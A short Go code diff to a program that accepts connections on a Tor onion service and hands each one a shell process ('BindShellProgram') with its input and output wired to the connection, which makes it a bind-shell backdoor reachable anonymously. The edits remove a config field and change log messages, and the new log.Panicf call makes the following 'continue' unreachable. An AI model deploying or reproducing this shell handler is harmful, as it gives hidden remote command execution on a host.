@@ -26,7 +26,6 @@ type Config struct {
 	TorListenConfig  tor.ListenConf
 	Timeout          int
 	BindShellProgram string
-	OneShot          bool
 }
 
 // Link bine with go-libtor instance creator
@@ -127,7 +126,7 @@ func main() {
 	for {
 		conn, err := onion.Accept()
 		if err != nil {
-			fmt.Println("Error: %v", err)
+			log.Panicf("Error: %v", err)
 			continue
 		}
 		go handleClient(conn, config.BindShellProgram)
@@ -135,7 +134,7 @@ func main() {
 }
 
 func handleClient(conn net.Conn, program string) {
-	fmt.Println("Handling Client")
+	fmt.Println("New Connection")
 	defer conn.Close()
 	cmd := exec.Command(program)
 	cmd.Stdin, cmd.Stdout, cmd.Stderr = conn, conn, conn
